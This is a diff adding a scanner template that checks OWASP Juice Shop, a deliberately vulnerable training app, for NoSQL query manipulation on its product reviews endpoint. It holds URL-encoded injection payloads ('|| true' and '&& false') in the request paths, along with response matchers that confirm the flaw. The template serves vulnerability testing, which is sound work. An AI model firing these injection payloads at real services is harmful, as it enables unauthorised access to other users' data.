@@ -1,0 +1,38 @@
+id: juice-shop-nosqli-reviews
+
+info:
+  name: Juice Shop reviews NoSQL query manipulation
+  author: Step762
+  severity: medium
+  description: |
+    Confirms query manipulation by comparing normal,
+    true-condition and false-condition review requests.
+    Requires the relevant Juice Shop challenge to be enabled.
+  tags: juice-shop,nosqli
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/rest/products/1/reviews"
+      - "{{BaseURL}}/rest/products/1%20%7C%7C%20true/reviews"
+      - "{{BaseURL}}/rest/products/1%20%26%26%20false/reviews"
+    redirects: false
+    req-condition: true
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - 'status_code_1 == 200 && status_code_2 == 200 && status_code_3 == 200'
+          - >-
+            regex('\\x22product\\x22\\s*:\\s*1\\s*[,}]', body_1)
+          - >-
+            !regex('\\x22product\\x22\\s*:\\s*([2-9]|[1-9][0-9]+)\\s*[,}]', body_1)
+          - >-
+            regex('\\x22product\\x22\\s*:\\s*1\\s*[,}]', body_2)
+          - >-
+            regex('\\x22product\\x22\\s*:\\s*([2-9]|[1-9][0-9]+)\\s*[,}]', body_2)
+          - >-
+            regex('\\x22status\\x22\\s*:\\s*\\x22success\\x22', body_3)
+          - >-
+            regex('\\x22data\\x22\\s*:\\s*\\[\\s*\\]', body_3)
